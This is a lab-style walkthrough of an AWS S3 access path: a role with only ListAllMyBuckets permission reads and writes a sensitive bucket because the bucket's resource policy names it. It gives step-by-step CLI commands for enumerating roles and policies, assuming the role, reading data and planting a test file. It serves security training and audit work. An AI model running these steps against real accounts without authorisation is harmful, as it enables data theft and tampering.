# Guided Walkthrough: S3 Bucket Access Through Resource Policy

This scenario demonstrates how a role with minimal IAM permissions can access an S3 bucket through a resource-based policy, bypassing traditional IAM permission restrictions.

The attack path shows how a user can assume a role with only `s3:ListAllMyBuckets` permission and still access sensitive data in an S3 bucket through a resource-based policy. This is a critical security vulnerability: resource policies can grant access even when IAM identity policies would otherwise restrict it, and a role with very limited permissions can reach sensitive data if the bucket's resource policy is misconfigured.

This configuration appears in real environments when teams manage S3 access through bucket policies alone, without cross-referencing which IAM principals can assume roles that are explicitly permitted in those bucket policies.

## The Challenge

You start as `pl-pathfinding-starting-user-prod` — an IAM user with permission to assume the `pl-bucket-access-role`. That role looks completely innocuous: its IAM identity policy grants only `s3:ListAllMyBuckets` on `*`. On the surface it has no bucket access at all.

Your target is the `pl-sensitive-data-bucket-{account_id}` S3 bucket. The twist is that the bucket's resource policy explicitly names `pl-bucket-access-role` as a principal and grants it `s3:ListBucket`, `s3:GetObject`, `s3:PutObject`, and `s3:DeleteObject`. AWS evaluates identity policies and resource policies independently — if the resource policy grants access and nothing explicitly denies it, the action is permitted regardless of what the IAM identity policy says.

You need to find the role, assume it, and then leverage the bucket's own policy to read (and write) its contents.

## Reconnaissance

First, verify your starting identity and get the account ID:

```bash
aws sts get-caller-identity --output json
```

With `iam:ListRoles` available, enumerate roles in the account and look for anything that references S3 or buckets:

```bash
aws iam list-roles --output json | jq -r '.Roles[].RoleName'
```

Once you spot `pl-bucket-access-role`, examine its trust policy to confirm you can assume it and its inline/attached policies to see just how limited it is:

```bash
aws iam get-role --role-name pl-bucket-access-role --output json
```

If you also have `s3:GetBucketPolicy`, list all buckets and inspect their resource policies looking for an explicit principal reference to the role you just found:

```bash
aws s3api list-buckets --output json
aws s3api get-bucket-policy --bucket pl-sensitive-data-bucket-{account_id} --output json
```

When you read the bucket policy you'll see the `AllowBucketAccessRole` statement — that's your way in.

## Exploitation

Assume `pl-bucket-access-role` using the starting user credentials:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-bucket-access-role \
  --role-session-name resource-policy-bypass \
  --output json
```

Export the returned temporary credentials:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
```

Now as the assumed role, list all buckets using the IAM identity policy permission:

```bash
aws s3api list-buckets --output json
```

You'll see `pl-sensitive-data-bucket-{account_id}` in the output. The IAM identity policy only grants `s3:ListAllMyBuckets` — that alone would not let you list or read objects in a specific bucket. But the bucket's resource policy changes the equation.

List objects in the sensitive bucket (permitted via the resource policy, not the IAM policy):

```bash
aws s3 ls s3://pl-sensitive-data-bucket-{account_id}/
```

Read a sensitive file:

```bash
aws s3 cp s3://pl-sensitive-data-bucket-{account_id}/sensitive-data.txt -
```

Test write access:

```bash
echo "attacker was here" > /tmp/test.txt
aws s3 cp /tmp/test.txt s3://pl-sensitive-data-bucket-{account_id}/attacker-file.txt
```

## Verification

Confirm the escalation by checking that a direct `s3:GetObject` attempt with a non-permitted role would fail — the access you just demonstrated is exclusively granted by the bucket resource policy. You can verify this by checking the caller identity while holding the assumed-role session:

```bash
aws sts get-caller-identity --output json
```

The `Arn` field will show `assumed-role/pl-bucket-access-role/resource-policy-bypass`, confirming you're operating as the role — and yet you have full read/write access to the bucket.

## What Happened

The `pl-bucket-access-role` IAM identity policy is a red herring for any IAM-only analysis tool. A scanner that only evaluates identity policies would conclude the role has no meaningful bucket access. The bucket's resource policy, however, is a separate access control mechanism that AWS evaluates independently — and it explicitly grants the role full object access.

This is how real environments get compromised: a team secures a bucket by naming specific role ARNs in the resource policy ("only this role can access this bucket"), but no one audits which other principals can assume that role. The attack path is invisible unless you correlate identity policies, trust policies, and resource policies together in a single graph traversal — exactly what pathfinding tools are designed to do.
